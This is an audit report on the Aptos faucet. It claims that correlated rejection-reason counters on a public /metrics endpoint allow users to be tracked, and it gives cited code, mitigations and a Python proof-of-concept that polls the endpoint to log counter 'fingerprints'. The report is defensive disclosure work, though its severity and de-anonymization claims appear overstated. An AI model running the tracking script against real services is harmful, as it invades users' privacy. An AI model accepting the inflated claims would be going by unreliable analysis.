# Audit Report

## Title
User De-anonymization Through Correlated Faucet Rejection Metrics

## Summary
The Aptos faucet service exposes fine-grained rejection reason metrics through a public `/metrics` endpoint. When multiple checkers reject a single request and `return_rejections_early` is configured to `false`, multiple rejection reason counters increment simultaneously. An attacker monitoring this endpoint can correlate these simultaneous counter increments to create unique "fingerprints" that track and de-anonymize individual users across multiple requests, violating user privacy expectations.

## Finding Description

The faucet service tracks rejection reasons using individual Prometheus counters in a publicly accessible metrics endpoint. The vulnerability arises from the interaction of three components:

**1. Multiple Rejection Reasons Per Request**

When the faucet processes a request, it runs multiple checkers sequentially. If `return_rejections_early` is set to `false`, all checkers execute even after rejections are found, accumulating multiple rejection reasons: [1](#0-0) 

**2. Separate Counter Tracking**

Each rejection reason code is tracked in a separate Prometheus counter. When an error response is generated, all rejection reasons increment their respective counters: [2](#0-1) [3](#0-2) 

**3. Public Metrics Exposure**

The metrics are exposed through an unauthenticated `/metrics` endpoint with CORS enabled: [4](#0-3) 

**Attack Scenario:**

1. An attacker continuously polls the public `/metrics` endpoint (e.g., every 5 seconds)
2. User A makes a request that triggers multiple checkers:
   - IP address is in blocklist → `IpInBlocklist` (code 102)
   - Referer is blocklisted → `RefererBlocklisted` (code 108)  
   - Rate limit exceeded → `UsageLimitExhausted` (code 101)
3. The attacker observes three counters incrementing together at timestamp T:
   - `aptos_tap_rejection_reason_count{rejection_reason_code="102"}` +1
   - `aptos_tap_rejection_reason_count{rejection_reason_code="108"}` +1
   - `aptos_tap_rejection_reason_count{rejection_reason_code="101"}` +1
4. If this combination is sufficiently unique, the attacker creates a "fingerprint" for User A
5. When User A makes future requests, the same pattern of counter increments recurs
6. The attacker can track User A's behavior over time, count their requests, and potentially de-anonymize them if they have auxiliary information (e.g., knowing which IPs or referers are blocklisted)

The HISTOGRAM and RESPONSE_STATUS metrics provide additional timing correlation data that can strengthen the attack: [5](#0-4) 

## Impact Explanation

This vulnerability enables **privacy violations through persistent user tracking and potential de-anonymization**. While it doesn't directly cause fund loss or consensus violations, it represents a **Medium severity** issue because:

1. **Persistent User Tracking**: Attackers can monitor when specific users interact with the faucet service, building behavioral profiles over time
2. **De-anonymization Risk**: Combined with auxiliary information (e.g., knowledge of specific blocklisted IPs/referers), attackers can identify real-world users
3. **Targeted Attack Enablement**: Once users are tracked, they become targets for social engineering, phishing, or other secondary attacks
4. **Privacy Expectation Violation**: Users reasonably expect that their rejected requests don't create trackable signatures

This exceeds a "minor information leak" (Low severity) because it enables **systematic, persistent tracking** rather than one-time information disclosure.

## Likelihood Explanation

**Likelihood: High**

The attack is highly likely to occur because:

1. **Zero Prerequisites**: Attacker needs no special access, credentials, or technical sophistication
2. **Trivial Exploitation**: A simple script polling `/metrics` every few seconds is sufficient
3. **No Detection**: The attacker's monitoring is indistinguishable from legitimate Prometheus scrapers
4. **Configuration Dependency**: When `return_rejections_early` is `false` (which provides better UX by showing all rejection reasons), the vulnerability is fully exploitable
5. **Real-World Applicability**: Many faucet deployments will have unique combinations of rejection reasons for specific users (e.g., VPN users with specific referers)

The configuration setting shows the trade-off was recognized: [6](#0-5) 

## Recommendation

**Immediate Mitigations:**

1. **Set `return_rejections_early: true` by default** to minimize multiple rejection reasons per request
2. **Restrict metrics endpoint access** via authentication or IP allowlisting for legitimate monitoring systems
3. **Aggregate rejection reasons** into a single counter that increments once per rejected request, regardless of how many checkers failed

**Long-term Solutions:**

1. **Implement differential privacy** by adding controlled noise to counter increments
2. **Use aggregate rejection categories** instead of fine-grained codes (e.g., "RateLimitFamily" instead of separate counters per rate limit type)
3. **Add metrics sampling** where only a percentage of rejections are recorded
4. **Implement time-bucketed aggregation** where counters only update every N minutes with cumulative values

**Example Fix for Immediate Mitigation:**

Modify the metrics tracking to increment a single "rejected_requests" counter per response:

```rust
// In crates/aptos-faucet/core/src/middleware/metrics.rs
pub static REJECTIONS: Lazy<IntCounter> = Lazy::new(|| {
    register_int_counter!(
        "aptos_tap_rejections_total",
        "Total number of rejected requests (prevents correlation attacks)"
    ).unwrap()
});

// In crates/aptos-faucet/core/src/endpoints/errors.rs
pub fn bump_rejection_metrics(rejection_reasons: &[RejectionReason]) {
    if !rejection_reasons.is_empty() {
        // Only increment once per rejected request
        REJECTIONS.inc();
        // Optionally log detailed reasons internally without exposing them
    }
}
```

## Proof of Concept

```python
#!/usr/bin/env python3
"""
PoC: Faucet User Correlation Attack
Monitors the Aptos faucet metrics endpoint and detects correlated rejection patterns.
"""

import time
import requests
from collections import defaultdict
from datetime import datetime

METRICS_URL = "http://faucet-host:8081/metrics"
POLL_INTERVAL = 3  # seconds

def parse_metrics(text):
    """Extract rejection reason counter values."""
    counters = {}
    for line in text.split('\n'):
        if line.startswith('aptos_tap_rejection_reason_count'):
            # Parse: aptos_tap_rejection_reason_count{rejection_reason_code="102"} 45
            parts = line.split('{rejection_reason_code="')
            if len(parts) == 2:
                code = parts[1].split('"')[0]
                value = int(parts[1].split('}')[1].strip())
                counters[code] = value
    return counters

def detect_correlations(old_counters, new_counters):
    """Find rejection codes that incremented together."""
    increments = {}
    for code in new_counters:
        old_val = old_counters.get(code, 0)
        new_val = new_counters[code]
        if new_val > old_val:
            increments[code] = new_val - old_val
    
    if len(increments) > 1:
        # Multiple rejection codes incremented - potential user fingerprint
        pattern = tuple(sorted(increments.keys()))
        return pattern
    return None

def main():
    print("[*] Starting faucet correlation attack PoC")
    print(f"[*] Monitoring: {METRICS_URL}")
    print(f"[*] Poll interval: {POLL_INTERVAL}s\n")
    
    previous_counters = {}
    user_fingerprints = defaultdict(int)
    
    while True:
        try:
            resp = requests.get(METRICS_URL, timeout=5)
            if resp.status_code != 200:
                print(f"[!] Error fetching metrics: {resp.status_code}")
                time.sleep(POLL_INTERVAL)
                continue
            
            current_counters = parse_metrics(resp.text)
            
            if previous_counters:
                pattern = detect_correlations(previous_counters, current_counters)
                if pattern:
                    user_fingerprints[pattern] += 1
                    timestamp = datetime.now().strftime("%H:%M:%S")
                    print(f"[{timestamp}] Correlated rejection pattern detected:")
                    print(f"            Codes: {pattern}")
                    print(f"            Total occurrences: {user_fingerprints[pattern]}")
                    print(f"            --> Likely tracking user with this fingerprint\n")
            
            previous_counters = current_counters
            time.sleep(POLL_INTERVAL)
            
        except KeyboardInterrupt:
            print("\n[*] Attack stopped")
            print("\n[*] Summary of tracked user fingerprints:")
            for pattern, count in user_fingerprints.items():
                print(f"    {pattern}: {count} requests")
            break
        except Exception as e:
            print(f"[!] Exception: {e}")
            time.sleep(POLL_INTERVAL)

if __name__ == "__main__":
    main()
```

**Expected Output:**
```
[*] Starting faucet correlation attack PoC
[*] Monitoring: http://faucet-host:8081/metrics
[*] Poll interval: 3s

[14:32:15] Correlated rejection pattern detected:
            Codes: ('101', '102', '108')
            Total occurrences: 1
            --> Likely tracking user with this fingerprint

[14:35:42] Correlated rejection pattern detected:
            Codes: ('101', '102', '108')
            Total occurrences: 2
            --> Likely tracking user with this fingerprint

[14:38:19] Correlated rejection pattern detected:
            Codes: ('101', '102', '108')
            Total occurrences: 3
            --> Likely tracking user with this fingerprint
```

This demonstrates how an attacker can identify and track users based on their unique rejection reason combinations across multiple requests.

---

## Notes

The vulnerability exists at the intersection of three design decisions: (1) collecting multiple rejection reasons for better user experience, (2) tracking fine-grained metrics for observability, and (3) exposing metrics publicly for monitoring. Each decision is individually reasonable, but their combination creates a privacy leak. The fix requires balancing observability needs with privacy guarantees, potentially through differential privacy techniques or access-controlled metrics endpoints.

### Citations

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L262-270)
```rust
        let mut rejection_reasons = Vec::new();
        for checker in &self.checkers {
            rejection_reasons.extend(checker.check(checker_data.clone(), dry_run).await.map_err(
                |e| AptosTapError::new_with_error_code(e, AptosTapErrorCode::CheckerError),
            )?);
            if !rejection_reasons.is_empty() && self.return_rejections_early {
                break;
            }
        }
```

**File:** crates/aptos-faucet/core/src/endpoints/errors.rs (L100-108)
```rust
impl From<AptosTapError> for AptosTapErrorResponse {
    fn from(error: AptosTapError) -> Self {
        // We use this opportunity to bump metrics based on the specifics of
        // this response, since this function is only called right when we're
        // about to return this error to the client.
        bump_rejection_reason_counters(&error.rejection_reasons);
        let (status, retry_after) = error.status_and_retry_after();
        Self::Default(status, Json(error), retry_after)
    }
```

**File:** crates/aptos-faucet/core/src/middleware/metrics.rs (L55-60)
```rust
pub fn bump_rejection_reason_counters(rejection_reasons: &[RejectionReason]) {
    for rejection_reason in rejection_reasons {
        REJECTION_REASONS
            .with_label_values(&[&format!("{}", rejection_reason.get_code() as u32)])
            .inc();
    }
```

**File:** crates/aptos-faucet/metrics-server/src/server.rs (L26-39)
```rust
#[handler]
fn metrics() -> Vec<u8> {
    encode_metrics(TextEncoder)
}

pub fn run_metrics_server(
    config: MetricsServerConfig,
) -> impl Future<Output = Result<(), std::io::Error>> {
    let cors = Cors::new().allow_methods(vec![Method::GET]);
    Server::new(TcpListener::bind((
        config.listen_address.clone(),
        config.listen_port,
    )))
    .run(Route::new().at("/metrics", metrics).with(cors))
```

**File:** crates/aptos-faucet/core/src/middleware/log.rs (L127-139)
```rust
                // Log response statuses generally.
                RESPONSE_STATUS
                    .with_label_values(&[response_log.response_status.to_string().as_str()])
                    .observe(response_log.elapsed.as_secs_f64());

                // Log response status per-endpoint + method.
                HISTOGRAM
                    .with_label_values(&[
                        self.request_log.method.as_str(),
                        response_log.operation_id,
                        response_log.response_status.to_string().as_str(),
                    ])
                    .observe(response_log.elapsed.as_secs_f64());
```

**File:** crates/aptos-faucet/core/src/server/run.rs (L43-47)
```rust
    /// Whether we should return rejections the moment a Checker returns any,
    /// or should instead run through all Checkers first. Generally prefer
    /// setting this to true, as it is less work on the tap, but setting it
    /// to false does give the user more immediate information.
    pub return_rejections_early: bool,
```
